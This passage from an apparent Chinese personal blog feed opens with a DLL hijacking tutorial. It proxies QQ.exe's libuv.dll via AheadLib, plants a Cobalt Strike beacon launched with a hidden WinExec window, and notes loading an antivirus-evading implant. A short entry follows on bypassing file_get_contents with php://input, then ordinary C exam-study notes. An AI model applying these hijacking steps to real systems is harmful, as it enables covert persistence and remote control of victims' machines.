<p>用cff打开qq.exe的导入表</p>
<p>找一个不在<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</code>路径里面的dll劫持，因为在这个路径里面的dll是优先加载的，加载之后已经进入内核空间，想要劫持难度很大。</p>
<p>这里找的是libuv.dll</p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20221002102747166.png" alt="image-20221002102747166"></p>
<p>找到路径下的文件</p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20221002102932669.png" alt="image-20221002102932669"></p>
<p>然后使用到aheadlib这个工具，输入dll就填QQ.exe路径下的<code>libuv.dll</code>，输出CPP会自动生成，原始DLL的名称要记住，等下会替换  libuvOrg</p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20221002103349853.png" alt="image-20221002103349853"></p>
<p>打开cpp文件，新建一个vs dll项目，然后将.cpp的代码复制进去，并加上<code>&lt;windows.h&gt;</code>和<code>&lt;stdlib.h&gt;</code>头文件。</p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20221002104055270.png" alt="image-20221002104055270"></p>
<p>然后在入口函数的地方填上一个弹出计算器的语句</p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20221002103903382.png" alt="image-20221002103903382"></p>
<p>将原dll文件改名为之前在软件里面复制的名字<code>libuvOrg.dll</code>，并把我们生成的dll文件复制进去</p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20221002104259035.png" alt="image-20221002104259035"></p>
<p>他妈的我这里怎么生成了两次喵</p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20221002104350538.png" alt="image-20221002104350538"></p>
<p>嘛~至少目的也达到了</p>
<p>直接转发的原理就是当qq要调用我这文件的函数的时候，我们指定原来的org文件，让qq去调用那里面的函数。</p>
<h3 id="cs上线小实例"><a href="#cs上线小实例" class="headerlink" title="cs上线小实例"></a>cs上线小实例</h3><p>代码改成我们的上线命令</p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20221002105542790.png" alt="image-20221002105542790"></p>
<p>成功上线！但是还不够完美有个窗口弹出来，我们用命令行的start /b参数来隐藏</p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20221002105821744.png" alt="image-20221002105821744"></p>
<p>但是还是有弹窗，通过了解可以使用这个函数来隐藏弹窗</p>
<p><code>WinExec(&quot;****&quot;, SW_HIDE);</code></p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20221002113353214.png" alt="image-20221002113353214"></p>
<p>没弹窗了</p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20221002113533662.png" alt="image-20221002113533662"></p>
<p>也成功通过加载免杀马上线</p>
<h2 id="即时调用"><a href="#即时调用" class="headerlink" title="即时调用"></a>即时调用</h2><p>也就是在前面工具选择的时候选择即使调用，只不过原理不一样了</p>
<p><img src="/2022/10/02/dll%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20221002110553829.png" alt="image-20221002110553829"></p>
<p>即时调用实际上是调用了劫持dll的某个函数，只不过那个函数会jmp到原本的dll中的相应函数的地址。达到的效果相同，但是实现的原理不同。</p>
]]></content>
      <categories>
        <category>-miansha</category>
      </categories>
  </entry>
  <entry>
    <title>file_get_contents绕过</title>
    <url>/2021/12/27/file-get-contents%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>file_get_contents<br>用php伪协议php://input可以直接决定此函数返回的值</p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>c语言碎碎念</title>
    <url>/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/</url>
    <content><![CDATA[<h1 id="c语言碎碎念"><a href="#c语言碎碎念" class="headerlink" title="c语言碎碎念"></a>c语言碎碎念</h1><p>笔者没有系统学习过c语言，由于要考研，故重新开始学。看课的时候又不想做太过于详细的笔记，故此篇博客只是记录一下我认为有必要记录的琐碎知识方便复习，内容并不全面。重点围绕考研大纲</p>
<p>然后我的专业课的参考书其实是有课后习题的，那一本书的课后习题我会专门开一篇来进行记录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（一）C 语言程序设计</span><br><span class="line">1、程序设计语言基础</span><br><span class="line">（1）基本数据类型、变量、常量和赋值；</span><br><span class="line">（2）各种运算符和表达式求值； </span><br><span class="line">（3）输入和输出；</span><br><span class="line">（4）选择结构：if语句和switch语句；</span><br><span class="line">（5）循环结构：for循环、while循环和do-while循环。</span><br><span class="line">2、复杂数据类型</span><br><span class="line">（1）数组：一维数组、二维数组；</span><br><span class="line">（2）字符数组；</span><br><span class="line">（3）结构体：结构体变量和结构体数组；</span><br><span class="line">（4）联合体；</span><br><span class="line">（5）枚举类型。</span><br><span class="line">3、模块化程序设计</span><br><span class="line">（1）函数的原型声明、调用及返回；</span><br><span class="line">（2）函数参数；</span><br><span class="line">（3）变量的存储特性。</span><br><span class="line">4、指针及其应用</span><br><span class="line">（1）指针的概念与定义；</span><br><span class="line">（2）指针与数组；</span><br><span class="line">（3）指针与字符串；</span><br><span class="line">（4）指针与结构体；</span><br><span class="line">（5）多级指针；</span><br><span class="line">（6）链表：定义、创建、插入、删除、销毁等操作。</span><br><span class="line">5、文件操作</span><br><span class="line">（1）文件的概念；</span><br><span class="line">（2）文件操作相关的函数功能；</span><br><span class="line">（3）与文件相关的编程方法。</span><br><span class="line">6、综合算法设计</span><br><span class="line">（1）程序设计的常用算法；</span><br><span class="line">（2）程序控制结构的流程图表示，能够用规范的流程图进行算法设计；</span><br><span class="line">（3）利用算法解决和处理实际问题。</span><br></pre></td></tr></table></figure>



<h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;number1,&amp;number2) <span class="comment">//这里就是从键盘接收两个数据，并且讲数据赋值给number1和number2这两个变量， &amp; 是地址运算符，分别获得这三个变量的内存地址。（我才是讲师好吧）😋</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sum=%d\n&quot;</span>,sum)<span class="comment">//这里的%d是按十进值格式输入的数值，后面的\n是换行符，sum的值赋到占位符那里，随后输出。%d的占位符是用给int类型的，double浮点型用的是%lf</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//下面是画图需要的两个库</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;graphics.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line">initgraph(<span class="number">400</span>,<span class="number">400</span>)<span class="comment">//初始化为图形模式，窗口大小为400*400</span></span><br><span class="line">circle(<span class="number">200</span>,<span class="number">200</span>,<span class="number">75</span>)<span class="comment">//以(200,200)为圆心，绘制半径为75的园。</span></span><br><span class="line">getch()<span class="comment">//函数是从输入流中读取一个字符并返回该字符的函数。它是一个非标准函数，通常被用于控制台程序中，用于实现对用户输入的即时响应。</span></span><br><span class="line">closegraph();<span class="comment">//关闭图形模式。</span></span><br></pre></td></tr></table></figure>

<p>然后我用的教材也是我对应的学校的教材，所以每一章的课后习题是那个教材的。</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a * a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f(<span class="number">3</span>));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个就是定义了一个函数，计算a的平方，下面就是调用了这个函数f</p>
<p>每一个参数的作用域都是在函数内部（也就是定义的里面，也就是形参。）</p>
<p>其实main函数也可以不用定义返回值，这样就不用写return语句了。也就是main前面的int可以去掉。但是不知道为什么我的vs里面就不能去掉，这个视频说的是可以去掉的也演示了一下</p>
<p>并且运行的顺序也是都是从main函数开始运行的。同时定义的函数是不能写在main函数后面的，必须要写在main前面。但是如果类似如下即可执行：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a * a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pr</span><span class="params">()</span></span>;  <span class="comment">//注意这里的pr后面有分号，意味着扩展函数pr的作用域到此。同时扩展的函数形参是可以省略掉只写上形参的数据类型即可。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f(<span class="number">3</span>));</span><br><span class="line">	pr();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pr</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;xss&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>同时一个函数的定义是不能放在一个函数体里面，必须是平行的。</p>
<h2 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="keyword">double</span> a, b; <span class="comment">//double是浮点型数据类型</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入2个数：\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%lf%lf&quot;</span>,&amp;a,&amp;b); <span class="comment">//取地址符</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a is %lf\nb is %lf\n&quot;</span>, a, b);</span><br><span class="line">	<span class="keyword">if</span> (a &gt;= b)	</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;a是最大值，其值为:%1f\n&quot;</span>, a);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;b是最大值，其值为:%1f\n&quot;</span>, b);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//方法2</span></span><br><span class="line">    <span class="keyword">if</span>(a&lt;b)</span><br><span class="line">        a=b;   <span class="comment">//谁大就赋值到a上</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;最大值为:%lf&quot;</span>,a);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这是一个输出最大值的程序</span></span><br></pre></td></tr></table></figure>

<p>当多个if语句使用时，elses是属于紧挨着它的上面那个if语句d的内容</p>
<p>当表达式的值为0，表达为假；否则表达式为真。（表达式这个式子返回的结果就是1或者是0，当然其他非零值的表达式结果也为真）</p>
<h2 id="printf和scanf函数"><a href="#printf和scanf函数" class="headerlink" title="printf和scanf函数"></a>printf和scanf函数</h2><p>pintf的返回值是整型数据，是输出字符串的个数。</p>
<p>scanf的返回值也是整型数据，是输入变量的个数。</p>
<h3 id="scanf函数的注意事项"><a href="#scanf函数的注意事项" class="headerlink" title="scanf函数的注意事项"></a>scanf函数的注意事项</h3><p>1.使用scanf函数输入数据，为什么需要按回车—-回车可以刷新键盘缓冲区内容。键盘缓冲区会有一个换行字符。</p>
<p>2.scanf函数遇到错误输入会停止</p>
<p>3.scanf函数的格式字符串中的字符分类</p>
<p>a.格式声明（格式说明符）：%c是字符串,%d是整形数据，%lf是double类型的数据。值得注意的是，一个格式说明符只能存一个单位的变量，对于字符串来说就是一个字母。</p>
<p>b.空白字符（一共有三种，换行，空格和tab（’\n’,’ ‘和’\t’）—-scanf在读操作中忽略掉1个h或d多个空白字符。）</p>
<p>c.非空白字符–scanf在进行读操作的时候剔除掉与这个非空白字符一样的字符</p>
<p>4.对于输入连续的整型或者浮点型数据，可以用空白符起到间隔的数据的作用。但是对于连续的字符型，就不能使用空白符来间隔，</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230728170337120.png" alt="image-20230728170337120"></p>
<p>对于第2.条的解释就像这个图片中一样，如果1的scanf出错了，没有输入整型变量，那么这个第一个scanf就会停止，然后这个#就会被下面的第二个scanf函数接收并赋值到a，由此其实也可以推出很多的编程思路，如自动分类变量类型等。</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230728170720679.png" alt="image-20230728170720679"></p>
<p>对于这种的scanf，在输入数据之后，按下回车不会立即结束scanf函数，因为后面的<code>\n</code>会让我们输入的换行符被scanf语句忽略掉，之后输入的所有的空白字符都会被scanf忽略掉，想要停止此scanf函数只有输入错误的数据类型才可以使用其特性停止，但是这时候前面输入的正确的数据其实已经被赋值进相应的内存地址里面了。</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230728171124512.png" alt="image-20230728171124512"></p>
<p>对于这种的scanf函数，必须按照其他非空白字符的内容一起输入才能正确赋值a变量，要不然则会让scanf函数停止，a就只能保持垃圾值的状态。</p>
<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>概念学习：</p>
<p>1.理解概念：优先级，操作数，结合方向—初等运算符优先等级为1（最高等级的优先级），单目运算符优先等级为2.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">比如说</span><br><span class="line">1+2  这个+就是双目</span><br><span class="line">&amp;a   这个&amp;就是单目</span><br><span class="line"></span><br><span class="line">同时括号就是初等运算符之一</span><br></pre></td></tr></table></figure>

<p>2.只有单目运算符和赋值运算符的结合方向是自左往右的。</p>
<p><a href="https://blog.csdn.net/duiwangxiaomi/article/details/126495071">(12条消息) C语言运算符优先级列表(超详细)_c优先级_对望小秘的博客-CSDN博客</a></p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230728174851707.png" alt="image-20230728174851707"></p>
<h3 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h3><p>1.出好运算符的操作数如果都为整型，那么其结果也为整型。会省略商后面的小数部分。如果操作数中有一个小数，那么输出的结果也是小数。</p>
<p>2.把浮点型数据赋值给整型变量的时候，会丢失掉小数部分，只取整数部分。</p>
<p>3.取余符号<code>%</code>两边操作数都不能是浮点型数据。</p>
<p>4.赋值表达式的值是其左操作数最终的值，这个值为一个左值。</p>
<h3 id="运算符2"><a href="#运算符2" class="headerlink" title="运算符2"></a>运算符2</h3><p>1.逗号表达式的值，是其最右i表达式的值。（逗号运算符的优先级是15级，是最低的）</p>
<p>2.在c语言中，优先级并不完全决定运算顺序。</p>
<p>3.只有运算符（&amp;&amp;  ||  逗号  条件运算符）规定了运算顺序，必须自左往右，即使有括号也会先执行左边的语句。</p>
<p>4.&amp;&amp;和||都先计算左边表达式的值，如果左边表达式的值能够确定整个表达式的值，那么右边表达式的值就不会被计算。</p>
<p>4.操作数的求值运算，不同的编译器可能有所不同—不要依赖任何不可移植操作。（类似下面这串代码）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">((a += <span class="number">1</span>) + (a *= <span class="number">2</span>))  <span class="comment">//两边的表达式不知道先计算那一边</span></span><br></pre></td></tr></table></figure>

<h3 id="运算符3-条件运算符"><a href="#运算符3-条件运算符" class="headerlink" title="运算符3-条件运算符"></a>运算符3-条件运算符</h3><p>1.条件运算符是c语言中唯一的三目运算符，其优先级为13</p>
<p>2.c语言中条件运算符的运算方向也必须自左往右的</p>
<p>下面举几个例子</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>?<span class="built_in">printf</span>(<span class="string">&quot;哈哈\n&quot;</span>):<span class="built_in">printf</span>(<span class="string">&quot;呵呵\n&quot;</span>);</span><br><span class="line"><span class="comment">//输出哈哈，就是类似于ifesle语句，为真就执行前面那个表达式，为假就执行后面那个表达式。</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230728203704412.png" alt="image-20230728203704412"></p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230728203731554.png" alt="image-20230728203731554"></p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230728203816983.png" alt="image-20230728203816983"></p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230728203930506.png" alt="image-20230728203930506"></p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230728204057199.png" alt="image-20230728204057199"></p>
<p>这些例子都需要好好看，我相信大家能理解，而且这些例子我认为肯定会在题目上出的。</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230728204233563.png" alt="image-20230728204233563"></p>
<h2 id="全局变量及宏定义"><a href="#全局变量及宏定义" class="headerlink" title="全局变量及宏定义"></a>全局变量及宏定义</h2><p>1.宏名，全局变量名建议大写</p>
<p>2.#开头的都是预处理指令，预处理是发生在预编译阶段（编译阶段之前），对源程序文件进行一些简单的文本替换–VC++中编译按钮集成了预编译和编译的</p>
<p>3.全局变量的作用域就是从定义处开始，到整个文件末尾。</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230729164043384.png" alt="image-20230729164043384"></p>
<p>其中未初始化的全局变量，系统就给他默认初始化为0。（全局变量就是除了形参变量之外所有函数体之外定义的变量）</p>
<h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><p>&amp;&amp;逻辑与</p>
<p>||逻辑或</p>
<p>printf里面嵌套函数可以输出函数的返回值</p>
<p>if else语句也可以循环嵌套。</p>
<h3 id="c语言中的关键字"><a href="#c语言中的关键字" class="headerlink" title="c语言中的关键字"></a>c语言中的关键字</h3><p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230728204336212.png" alt="image-20230728204336212"></p>
<h3 id="标识符的命名规范"><a href="#标识符的命名规范" class="headerlink" title="标识符的命名规范"></a>标识符的命名规范</h3><p>1.标识符只能由字母、数字、下划线构成。而且必须是字母或者是下划线开头。</p>
<p>2.自己定义的标识符不能和c语言的关键字相同</p>
<p>3.不同的c语言编译器c语言标识符的长度标准不同</p>
<p>4.同一个“花括号”中，不能直接定义重名变量。</p>
<p>5.在文件的某处引用重名变量时，所引用的变量就是作用域较小的那一个变量。</p>
<h1 id="第二章-算法"><a href="#第二章-算法" class="headerlink" title="第二章 算法"></a>第二章 算法</h1><h2 id="算法的基本概念"><a href="#算法的基本概念" class="headerlink" title="算法的基本概念"></a>算法的基本概念</h2><p>一、一个程序主要包含的2方面信息</p>
<p>1.对数据的描述，在程序中要指定用到哪些数据以及这些数据的类型和数据的组织形式。这就是数据结构</p>
<p>2.对操作的描述。即要求计算机进行操作的步骤，也就是算法。</p>
<p>二、沃斯提出的一个公式  算法+数据结构=程序</p>
<p>三、计算机算法可各位2大类别：数值运算算法和非数值运算算法</p>
<p>四、算法的特性：1.有穷性2.确定性3.有零个或多个输入4.有一个或者多个输出5.有效性</p>
<h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><h3 id="while语句"><a href="#while语句" class="headerlink" title="while语句"></a>while语句</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (i &lt;= <span class="number">10</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">		i = i + <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面这个就是一个while的循环语句，当while条件括号里面的表达式是真的时候，就会执行花括号里面的内容，根据这个东西，我们就可以推断，while括号里面的内容，是必定会执行一遍的。</p>
<p>所以如果while里面的是一个表达式，那么就可能造成危害，如下</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230730170456764.png" alt="image-20230730170456764"></p>
<img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/一些笔记\c语言\c语言碎碎念\image-20230730170505802.png" alt="image-20230730170505802" style="zoom:67%;">

<p>（不知不觉就开始了捏）</p>
<p>回到正题</p>
<h3 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; i = i + <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>if语句里面有三个语句，第一个是初始化值，中间那个是设置条件，第三个是执行完花括号之后会执行的语句。</p>
<p>第二个条件成立的时候，不会执行第三个条件而是直接跳转到花括号里面，等花括号执行完毕之后，才会执行第三个语句。</p>
<p>同时，如果第二个条件不成立的时候，也不会执行第三个语句，而是直接跳转到花括号外面继续执行。</p>
<h3 id="i-与-i"><a href="#i-与-i" class="headerlink" title="i++与++i"></a>i++与++i</h3><p>这两个东西的区别已经是老生常谈了。</p>
<p>大概理解就是，需要调用i++或者++i的时候，把他看作是一个变量，++i就是先增加再调用，i++就是先调用再增加。下面写一个例子来形象的说明一下这个问题。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i++);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line"></span><br><span class="line">	i = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ++i);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是以上程序的执行结果</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230730171449264.png" alt="image-20230730171449264"></p>
<p>扩展一个难题（大概吧）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,%d\n&quot;</span>, x, x++);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, x);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>printf(“%d,%d\n”, x, x++)</code>函数，从右向左计算，然后从左向右输出。</p>
<p>就像下面一样，首先左边的%d获取最右边的x++的值，然后第二个%d获得最左边的i（此时已经执行过i++）的值</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230730172433602.png" alt="image-20230730172433602"></p>
<p>当然！！！！！最重要的是在不同的编译情况下printf的运算规则是不一样的，我看的教学视屏里面是从右往左，但是我的不是，我的是vs。</p>
<h2 id="算法的表示法"><a href="#算法的表示法" class="headerlink" title="算法的表示法"></a>算法的表示法</h2><p>1.自然语言表示法</p>
<p>2.用流程图表示</p>
<p>下面是一些美国国家标准协会规定的一些常用的流程图符号。</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230730172955838.png" alt="image-20230730172955838"></p>
<p>举个例子</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230730173706002.png" alt="image-20230730173706002"></p>
<p>上面这个流程图就是计算5的阶乘。下面是三中基本结构</p>
<p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230730174014435.png" alt="image-20230730174014435"></p>
<p>然后呢，流程图的主要弊端就是，对流程线的使用没有严格的限制，使用者可以不受限制的使流程随意的转来转去。这种乱麻一样的流程图算法称之为BS算法。</p>
<p>为此我们引入了N-S流程图</p>
<h3 id="N-S流程图表示法"><a href="#N-S流程图表示法" class="headerlink" title="N-S流程图表示法"></a>N-S流程图表示法</h3><p><img src="/2023/08/31/c%E8%AF%AD%E8%A8%80%E7%A2%8E%E7%A2%8E%E5%BF%B5/image-20230730174103972.png" alt="image-20230730174103972"></p>
<p>这个是求5的阶乘的N-S流程图</p>
